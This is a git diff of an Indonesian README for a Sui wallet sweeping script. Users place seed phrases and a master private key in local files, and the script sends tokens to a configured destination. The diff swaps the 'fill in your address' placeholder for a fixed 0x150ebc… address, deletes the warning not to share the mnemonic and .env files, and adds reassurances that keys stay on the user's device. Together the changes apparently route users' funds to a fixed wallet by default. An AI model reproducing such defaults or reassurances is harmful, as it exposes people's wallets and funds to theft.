@@ -27,12 +27,11 @@ npm install @mysten/sui dotenv
 
 **3. Buat File Konfigurasi**
 ```bash
-nano config.json
-```
-```bash
+cp mnemonics.example.json mnemonics.json
 nano mnemonics.json
 ```
 ```bash
+cp .env.example .env
 nano .env
 ```
 
@@ -68,12 +67,11 @@ npm install @mysten/sui dotenv
 
 **5. Buat File Konfigurasi**
 ```bash
-nano config.json
-```
-```bash
+cp mnemonics.example.json mnemonics.json
 nano mnemonics.json
 ```
 ```bash
+cp .env.example .env
 nano .env
 ```
 
@@ -90,7 +88,7 @@ npm start
 ```json
 {
   "rpc": "https://fullnode.mainnet.sui.io",
-  "destination": " ISI ADDRESS KAMU ",
+  "destination": "0x150ebc490620ce05775803cc55f0e33a16db1a6a7646501cd4b8989343d38799",
   "leaveSui": 0.0085,
   "delay": 3000,
   "ssrType": "0x79f0b9a0862120619e0ed79690c81be28032b63b2b4fb19226dc81f40fa60d03::SSR::SSR"
@@ -103,15 +101,25 @@ npm start
 - `delay` — delay antar wallet dalam milidetik
 - `ssrType` — coin type SSR token
 
-**mnemonics.json**
+**mnemonics.json** (salin dari template)
+```bash
+cp mnemonics.example.json mnemonics.json
+nano mnemonics.json
+```
+Isi dengan phrase wallet kamu:
 ```json
 [
-  "word1 word2 word3 ... word12",
-  "word1 word2 word3 ... word12"
+  "word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12",
+  "word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
 ]
 ```
 
-**.env**
+**.env** (salin dari template)
+```bash
+cp .env.example .env
+nano .env
+```
+Isi dengan private key master wallet:
 ```
 MASTER_PRIVATE_KEY=suiprivkey1qzg...
 ```
@@ -120,7 +128,8 @@ MASTER_PRIVATE_KEY=suiprivkey1qzg...
 
 ## Catatan
 
+- File `mnemonics.json` dan `.env` tidak akan ter-push ke GitHub karena ada di `.gitignore`
+- Phrase dan private key kamu **hanya tersimpan di device kamu sendiri**
 - Pastikan saldo SUI master wallet cukup sebelum menjalankan Menu 3
 - Script akan otomatis skip wallet yang saldonya tidak cukup
 - Delay antar wallet adalah 3 detik setelah transaksi terkonfirmasi
-- Jangan bagikan file `mnemonics.json` dan `.env` ke siapapun
